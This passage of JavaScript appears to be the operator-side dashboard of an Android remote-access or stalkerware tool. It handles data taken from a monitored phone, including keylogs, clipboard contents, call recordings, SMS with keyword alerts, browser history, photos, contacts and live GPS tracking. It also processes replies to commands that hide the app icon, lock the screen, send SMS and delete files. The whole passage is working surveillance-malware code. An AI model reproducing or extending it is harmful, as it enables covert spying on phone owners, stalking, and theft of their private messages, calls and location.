        case 'FILE_CHUNK': const tr=fileTransfers[json.transferId]; if(!tr)return; setTimeout(()=>{ try{ const bin=atob(json.data), bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i); tr.chunks[json.chunkIndex]=bytes; tr.received++; const pct=Math.round((tr.received/tr.totalChunks)*100); document.getElementById('progressPercent').innerText=pct+'%'; document.getElementById('progressBar').style.width=pct+'%'; if(tr.received===tr.totalChunks){ const blob=new Blob(tr.chunks), url=URL.createObjectURL(blob), a=document.createElement('a'); a.href=url; a.download=tr.fileName; a.click(); URL.revokeObjectURL(url); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; showNotification(`✅ Downloaded: ${tr.fileName}`); } }catch(e){ showNotification('Chunk decode error'); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; } },0); break;
        case 'FLASH_ON': flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('🔦 Flashlight ON'); break;
        case 'FLASH_OFF': flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('🔦 Flashlight OFF'); break;
        case 'APP_HIDDEN': iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; showNotification('App icon hidden'); break;
        case 'APP_SHOWN': iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; showNotification('App icon shown'); break;
        case 'CONTACTS_DATA': try{ displayContacts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'INSTALLED_APPS': try{ displayInstalledApps(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'APP_USAGE_DATA': try{ displayAppUsage(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'BROWSER_HISTORY_DATA': try{ displayBrowserHistory(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'WIFI_NETWORKS_DATA': try{ displayWifiNetworks(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'KEYLOG_DATA': try{ displayKeylog(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CLIPBOARD_DATA': try{ displayClipboard(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CALL_RECORDINGS_DATA': try{ displayCallRecordings(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'CALL_AUDIO_DATA': try{ const ca=typeof json.data==='string'?JSON.parse(json.data):json.data; if(ca&&ca.audio) playCallRecording(ca); }catch(e){} break;
        case 'RECENT_IMAGES_DATA': try{ displayPhotoGallery(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'LOCATION_HISTORY_DATA': try{ displayLocationHistory(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'APP_EVENTS_DATA': try{ displayAppEvents(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'SMS_KEYWORDS_DATA': try{ displaySmsKeywords(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'SMS_ALERTS_DATA': try{ displaySmsAlerts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
        case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
        case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
        case 'GEOFENCE_ALERT': pushAlert('Geofence',json.event==='EXIT'?'🚨 DEVICE LEFT safe zone!':'✅ Device returned to safe zone'); break;
        case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); break;
        case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
        case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); break;
        case 'SMS_SENT': showNotification('✅ SMS sent successfully'); break;
        case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES',{path:currentPath}); break;
        case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); break;
        case 'GPS_UPDATES_STOPPED': liveGpsActive=false; const gpsBtn=document.getElementById('liveGpsBtn'); if(gpsBtn){ gpsBtn.querySelector('span:last-child').textContent='Live GPS Track'; gpsBtn.style.cssText=''; } showNotification('GPS tracking stopped'); break;
        case 'NOTIFICATION_LIVE': pushAlert('📳 '+(json.app||'App'),(json.title||'')+': '+(json.text||'')); break;
        case 'CALL_ALERT': if(json.event==='RINGING') pushAlert('📞 Incoming Call',(json.name||'Unknown')+' ('+(json.number||'')+')'); else if(json.event==='MISSED') pushAlert('📵 Missed Call',(json.name||'Unknown')+' ('+(json.number||'')+')'); break;
        case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: '+json.keyword,'From '+json.from+': '+json.body); break;
        case 'HEARTBEAT': break;
        default: console.log('Unhandled type:',json.type);
    }
    pendingCommand=null;
}
function handlePlainText(msg){
    if(msg.startsWith("CAMERA_IMAGE:")) displayCapturedImage(msg.substring(13));
    else if(msg.startsWith("FLASH_ON")){ flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('Flash ON'); }
    else if(msg.startsWith("FLASH_OFF")){ flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('Flash OFF'); }
    else if(msg.startsWith("LOC_DATA:")) try{ renderMap(JSON.parse(msg.substring(9))); }catch(e){}
    else if(msg.startsWith("SMS_DATA:")) try{ displaySMS(JSON.parse(msg.substring(9))); }catch(e){}
    else if(msg.startsWith("CALL_DATA:")) try{ const d=JSON.parse(msg.substring(10)); const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }catch(e){}
    else if(msg.startsWith('[')||msg.startsWith('{')) try{ handleJSON(JSON.parse(msg)); }catch(e){}
}
function handleIncomingMessage(msg){
    try{ const j=JSON.parse(msg); if(j.type==='SIGNALING') handleSignaling(j.data); else handleJSON(j); }catch(e){ handlePlainText(msg); }
}
